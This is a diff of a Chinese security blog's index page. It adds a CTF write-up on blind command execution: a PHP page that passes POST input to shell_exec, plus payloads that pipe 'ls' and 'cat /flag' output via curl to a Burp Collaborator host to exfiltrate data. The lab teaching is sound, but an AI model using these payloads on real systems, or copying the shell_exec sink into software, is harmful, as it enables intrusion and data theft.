@@ -100,7 +100,7 @@
 			</ul>
 		</nav>
                                 <nav>
-    			总文章数 25
+    			总文章数 26
 		</nav>
 		<nav class="header-smart-menu">
 			
@@ -331,6 +331,128 @@
           </div>
           <div id="js-content" class="content-ll">
             
+
+  
+    <article id="post-命令执行无回显-BP流量监听" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE-BP%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC/" target="_blank">命令执行无回显-BP流量监听</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE-BP%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC/" class="archive-article-date">
+        <time datetime="2024-08-22T08:30:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-08-22</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+ 
+
+	
+		<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>题目往往就这么简单，但是当你输入cmd&#x3D;ls或者其他命令市无法回显，其中有多种方法可以查看回显，例如结合sleep一个一个爆破、使用服务器反弹一个shell，而这里用到的是BP自带的一个插件 Burp Collaborator </p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">打开<span class="selector-tag">Burp</span>主界面 <span class="selector-tag">--</span>&gt;菜单（<span class="selector-tag">Burp</span>）<span class="selector-tag">--</span>&gt;<span class="selector-tag">Burp</span> <span class="selector-tag">Collaboraor</span> <span class="selector-tag">Client</span> <span class="selector-tag">--</span> &gt; 点击 <span class="selector-tag">Copy</span> <span class="selector-tag">to</span> <span class="selector-tag">Clipboard</span></span><br></pre></td></tr></table></figure>
+
+<p>这里回获得一个URL</p>
+<p>接着BP抓包，cmd传入一下内容</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cmd</span>=要执行的命令 | <span class="selector-tag">curl</span> <span class="selector-tag">-d</span> @<span class="selector-tag">-</span> <span class="selector-tag">http</span>:<span class="comment">//URL(刚才copy的URL)</span></span><br></pre></td></tr></table></figure>
+
+<p>点击发送后，返回Burp Collaborator，点击Poll now获取流量监听</p>
+<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>网页打开就是上面题目说的那样，只有两行代码，且不会回显内容</p>
+<p>打开burpsuite抓包，发送到repeater</p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE-BP%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC/1.png"></p>
+<p>打开Burp Collaboraor Client，复制URL</p>
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE-BP%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC/2.png"></p>
+<p>执行ls &#x2F;</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cmd</span>=<span class="selector-tag">ls</span> | <span class="selector-tag">curl</span> <span class="selector-tag">-d</span> @<span class="selector-tag">-</span> <span class="selector-tag">http</span>:<span class="comment">//srn2gp8ir7u3luhfs3p4v7xt0k6auz.burpcollaborator.net</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE-BP%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC/3.png"></p>
+<p>执行cat &#x2F;flag</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">cmd</span>=<span class="selector-tag">cat</span> /<span class="selector-tag">flag</span> | <span class="selector-tag">curl</span> <span class="selector-tag">-d</span> @<span class="selector-tag">-</span> <span class="selector-tag">http</span>:<span class="comment">//srn2gp8ir7u3luhfs3p4v7xt0k6auz.burpcollaborator.net</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE-BP%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC/4.png"></p>
+
+	
+
+
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">命令执行·</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/webbug//" class="article-tag-list-link color2">webbug</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE-BP%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
 
   
     <article id="post-服务器请求伪造-SSRF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
@@ -1156,94 +1278,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A52/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-    <article id="post-红日渗透靶场-红日1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A51/" target="_blank">红日渗透靶场--红日1</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A51/" class="archive-article-date">
-        <time datetime="2024-06-01T04:54:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-06-01</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
- 
-
-			<p>靶场下载链接：</p>
-<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1r56G5IU9FoIC5pK-vWUrBQ">https://pan.baidu.com/s/1r56G5IU9FoIC5pK-vWUrBQ</a> </p>
-	
-
-
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">--红日靶场</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/%E7%BA%A2%E6%97%A5%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-%E7%BA%A2%E6%97%A51/">展开全文 >></a>
     </p>
     
 
